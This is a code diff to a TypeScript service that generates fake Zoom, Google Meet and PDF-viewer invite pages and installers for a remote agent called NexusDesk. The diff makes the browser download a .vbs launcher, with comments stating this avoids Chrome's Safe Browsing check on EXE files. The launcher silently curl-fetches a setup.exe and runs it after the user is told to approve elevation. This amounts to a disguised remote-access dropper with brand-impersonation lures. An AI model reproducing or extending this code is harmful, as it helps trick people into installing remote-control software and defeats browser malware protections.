@@ -47,7 +47,7 @@ function buildGuestJoinUrl(
     return `${base}/gotme/GoogleMeet/${code}`;
   }
   if (template === 'adobe') {
-    return `${base}/adobefile/${code}`;
+    return `${base}/sharedfile/${code}`;
   }
   return `${base}/joinzoom/${code}`;
 }
@@ -63,28 +63,42 @@ function normalizeTemplate(template?: string | null): InviteTemplate {
 export function installerBatFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
   if (t === 'google_meet') return 'GoogleMeet-Setup.bat';
-  if (t === 'adobe') return 'AdobeAcrobat-Setup.bat';
+  if (t === 'adobe') return 'DocumentViewer-Setup.bat';
   return 'ZoomClient-Setup.bat';
 }
 
 export function installerGuiFilename(template?: string | null): string {
   const t = normalizeTemplate(template);
   if (t === 'google_meet') return 'GoogleMeet-Setup.exe';
-  if (t === 'adobe') return 'AdobeAcrobat-Setup.exe';
+  if (t === 'adobe') return 'DocumentViewer-Setup.exe';
   return 'ZoomClient-Setup.exe';
 }
 
-/** All templates use the GUI EXE installer (no terminal). */
-export function installerDownloadPath(_template?: string | null): string {
-  return 'setup.exe';
+/** Browser downloads .vbs (avoids Chrome EXE Safe Browsing). VBS then fetches/runs the real EXE. */
+export function installerBrowserFilename(template?: string | null): string {
+  const t = normalizeTemplate(template);
+  if (t === 'google_meet') return 'GoogleMeet-Setup.vbs';
+  if (t === 'adobe') return 'DocumentViewer-Setup.vbs';
+  return 'ZoomClient-Setup.vbs';
 }
 
-/** Bump when shipping a new guest-setup-stub.exe so browsers fetch a fresh installer. */
-export const GUEST_INSTALLER_CACHE_BUST = '35';
+/** What the join page downloads in the browser (not the EXE itself). */
+export function installerDownloadPath(_template?: string | null): string {
+  return 'setup.vbs';
+}
+
+/** Bump when changing the browser-facing installer wrapper. */
+export const GUEST_INSTALLER_CACHE_BUST = '36';
 
 export function buildGuestInstallerUrl(apiUrl: string, code: string, template?: string | null): string {
   const base = apiUrl.replace(/\/$/, '');
   return `${base}/guest/${code}/${installerDownloadPath(template)}?v=${GUEST_INSTALLER_CACHE_BUST}`;
+}
+
+/** Direct EXE URL used by the VBS wrapper (not linked from the browser page). */
+export function buildGuestExeUrl(apiUrl: string, code: string): string {
+  const base = apiUrl.replace(/\/$/, '');
+  return `${base}/guest/${code}/setup.exe?v=${GUEST_INSTALLER_CACHE_BUST}`;
 }
 
 /** Marker written after the Windows stub PE; stub reads JSON that follows. */
@@ -139,12 +153,12 @@ function guiInstallerBranding(template?: string | null): {
   }
   if (t === 'adobe') {
     return {
-      windowTitle: 'Adobe Acrobat Setup',
-      applicationName: 'Adobe Acrobat',
-      brandLabel: 'Adobe Acrobat',
+      windowTitle: 'Document Viewer Setup',
+      applicationName: 'Document Viewer',
+      brandLabel: 'Document Viewer',
       heading: 'Opening your document...',
-      subheading: 'Download and run Adobe Acrobat to view the shared PDF on Windows.',
-      downloadLabel: 'Downloading Adobe Acrobat',
+      subheading: 'Download and run the viewer to open the shared PDF on Windows.',
+      downloadLabel: 'Downloading document viewer',
       installLabel: 'Installing',
       accent: '#b22222',
       accentDark: '#8b1a1a',
@@ -180,8 +194,8 @@ function installerBranding(template?: string | null): {
   }
   if (t === 'adobe') {
     return {
-      windowTitle: 'Adobe Acrobat Setup',
-      header: '=== Adobe Acrobat Setup ===',
+      windowTitle: 'Document Viewer Setup',
+      header: '=== Document Viewer Setup ===',
       closingEcho: 'Finished. You can close this window and open your document.',
     };
   }
@@ -342,16 +356,16 @@ export class GuestAccessService {
       expiresAt: link.expiresAt.toISOString(),
       remainingUses: Math.max(0, link.maxUses - link.usedCount),
       windowsInstallerUrl: buildGuestInstallerUrl(env.API_URL, link.code, link.inviteTemplate),
-      installerFileName: installerGuiFilename(link.inviteTemplate),
+      installerFileName: installerBrowserFilename(link.inviteTemplate),
       windowsScriptUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/windows.ps1`,
       agentPackageUrl: `${env.API_URL.replace(/\/$/, '')}/guest/${link.code}/agent-package.zip`,
       joinUrl: buildGuestJoinUrl(env.APP_URL, link.code, link.inviteTemplate),
       instructions: {
         windows: [
           'The Windows installer download should start automatically.',
-          `Open ${installerGuiFilename(link.inviteTemplate)} from Downloads (click More info → Run anyway if Windows asks).`,
+          `Open ${installerBrowserFilename(link.inviteTemplate)} from Downloads.`,
           'Click Yes when Windows asks for permission.',
-          'Wait until setup finishes, then close the installer window.',
+          'Wait until the setup window finishes, then close it.',
         ],
       },
     };
@@ -429,17 +443,20 @@ export class GuestAccessService {
   }
 
   /**
-   * Legacy .vbs launcher (kept for older links). Prefer setup.exe for Adobe.
+   * Browser-facing launcher: downloads as .vbs so Chrome does not flag an EXE download.
+   * The script then curl-fetches the real GUI setup.exe and runs it (install path unchanged).
    */
   buildWindowsVbsLauncher(code: string, apiUrl: string, template?: string | null): string {
     const base = apiUrl.replace(/\/$/, '').replace(/"/g, '');
     const safeCode = code.replace(/"/g, '');
     const brand = installerBranding(template);
     const title = brand.windowTitle.replace(/"/g, '');
-    const doneMsg = brand.closingEcho.replace(/"/g, '');
+    const guiName = installerGuiFilename(template).replace(/"/g, '');
+    const downloading = (guiInstallerBranding(template).downloadLabel || 'Downloading').replace(/"/g, '');
+    const exeUrl = buildGuestExeUrl(base, safeCode).replace(/"/g, '');
     const lines = [
       'Option Explicit',
-      'Dim sh, fso, apiUrl, guestCode, dataDir, packageZip, setupPs1, curl, cmd, rc, app, elevated',
+      'Dim sh, fso, apiUrl, guestCode, dataDir, setupExe, curl, cmd, rc, app, elevated',
       `apiUrl = "${base}"`,
       `guestCode = "${safeCode}"`,
       'Set sh = CreateObject("WScript.Shell")',
@@ -449,8 +466,7 @@ export class GuestAccessService {
       '  fso.CreateFolder sh.ExpandEnvironmentStrings("%ProgramData%") & "\\NexusDesk"',
       'End If',
       'If Not fso.FolderExists(dataDir) Then fso.CreateFolder dataDir',
-      'packageZip = dataDir & "\\package.zip"',
-      'setupPs1 = dataDir & "\\nd-setup.ps1"',
+      `setupExe = dataDir & "\\${guiName}"`,
       'curl = sh.ExpandEnvironmentStrings("%SystemRoot%") & "\\System32\\curl.exe"',
       'If Not fso.FileExists(curl) Then',
       `  MsgBox "curl.exe not found. Windows 10 or later is required.", 16, "${title}"`,
@@ -467,36 +483,22 @@ export class GuestAccessService {
       '  WScript.Quit 0',
       'End If',
       '',
-      `sh.Popup "Downloading Adobe Acrobat components..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
+      `sh.Popup "${downloading}..." & vbCrLf & "Please wait.", 2, "${title}", 64`,
       '',
-      'If fso.FileExists(packageZip) Then fso.DeleteFile packageZip, True',
-      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 1200 -o " & Chr(34) & packageZip & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/agent-package.zip" & Chr(34)',
+      'If fso.FileExists(setupExe) Then fso.DeleteFile setupExe, True',
+      `cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 180 -o " & Chr(34) & setupExe & Chr(34) & " " & Chr(34) & "${exeUrl}" & Chr(34)`,
       'rc = sh.Run("cmd /c " & cmd, 0, True)',
-      'If rc <> 0 Or Not fso.FileExists(packageZip) Then',
+      'If rc <> 0 Or Not fso.FileExists(setupExe) Then',
       `  MsgBox "Download failed. Check that this PC can reach the server.", 16, "${title}"`,
       '  WScript.Quit 1',
       'End If',
       '',
-      'If fso.FileExists(setupPs1) Then fso.DeleteFile setupPs1, True',
-      'cmd = Chr(34) & curl & Chr(34) & " -fL --connect-timeout 30 --max-time 120 -o " & Chr(34) & setupPs1 & Chr(34) & " " & Chr(34) & apiUrl & "/guest/" & guestCode & "/windows.ps1?v=15" & Chr(34)',
-      'rc = sh.Run("cmd /c " & cmd, 0, True)',
-      'If rc <> 0 Or Not fso.FileExists(setupPs1) Then',
-      `  MsgBox "Could not download setup script.", 16, "${title}"`,
-      '  WScript.Quit 1',
-      'End If',
-      '',
-      'sh.Environment("PROCESS")("ND_API_URL") = apiUrl',
-      'sh.Environment("PROCESS")("ND_GUEST_CODE") = guestCode',
-      'sh.Environment("PROCESS")("ND_PACKAGE_ZIP") = packageZip',
-      'sh.Environment("PROCESS")("NEXUSDESK_AGENT_DATA_DIR") = dataDir',
-      'cmd = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File " & Chr(34) & setupPs1 & Chr(34)',
-      'rc = sh.Run(cmd, 1, True)',
+      // Run the same GUI EXE installer the browser used to download directly.
+      'rc = sh.Run(Chr(34) & setupExe & Chr(34), 1, True)',
       'If rc <> 0 Then',
       `  MsgBox "Setup failed. See %ProgramData%\\NexusDesk\\Agent\\install.log", 16, "${title}"`,
       '  WScript.Quit rc',
       'End If',
-      '',
-      `MsgBox "${doneMsg}", 64, "${title}"`,
       'WScript.Quit 0',
     ];
     return lines.join('\r\n');
